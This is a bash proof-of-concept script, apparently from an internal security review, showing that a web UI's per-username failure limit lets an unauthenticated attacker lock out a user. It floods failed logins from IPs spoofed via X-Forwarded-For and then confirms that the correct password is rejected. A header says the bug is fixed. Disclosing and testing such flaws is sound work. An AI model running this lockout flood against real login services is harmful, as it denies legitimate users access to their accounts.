#!/usr/bin/env bash
# FIXED on web-ui (only successful logins are logged; events.jsonl rotates at 1 MiB; the user-name bucket slows, never blocks).
# PoC: the per-username failure bucket (LOGIN_USER_FAILS=20, server.py:559,567)
# lets an unauthenticated attacker lock out a legitimate user. 20 failed
# logins for a username (needs >=4 source IPs since per-IP cap is 5) make the
# server 429 EVERYONE for that username, including the real user with the
# correct password, for up to LOGIN_WINDOW=600s. Rank: MEDIUM (unauth DoS).
# Here we fake the source IPs via X-Forwarded-For (trusted from loopback when
# no Caddy is in front); in prod the attacker just uses 4 real IPs.
set -u
HOST=${1:-http://127.0.0.1:8699}
VICTIM=${2:-carson}
GOODPW=${3:?correct password for victim}
fail() { curl -s -o /dev/null -w '%{http_code}' -X POST "$HOST/api/login" \
  -H 'X-Escrow: 1' -H 'Content-Type: application/json' -H "X-Forwarded-For: $1" \
  --data-binary "{\"user\":\"$VICTIM\",\"password\":\"nope-nope-nope\"}"; }
echo "flooding 20 failed logins for user '$VICTIM' from 4 spoofed IPs..."
for ip in 10.0.0.1 10.0.0.2 10.0.0.3 10.0.0.4; do
  for n in 1 2 3 4 5; do printf '%s ' "$(fail $ip)"; done; echo " <- from $ip"
done
echo "now the REAL user, correct password, from a fresh IP:"
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$HOST/api/login" \
  -H 'X-Escrow: 1' -H 'Content-Type: application/json' -H 'X-Forwarded-For: 10.9.9.9' \
  --data-binary "{\"user\":\"$VICTIM\",\"password\":\"$GOODPW\"}")
echo "login with CORRECT password -> HTTP $code  $([ "$code" = 429 ] && echo 'LOCKED OUT (DoS confirmed)' || echo 'got in')"
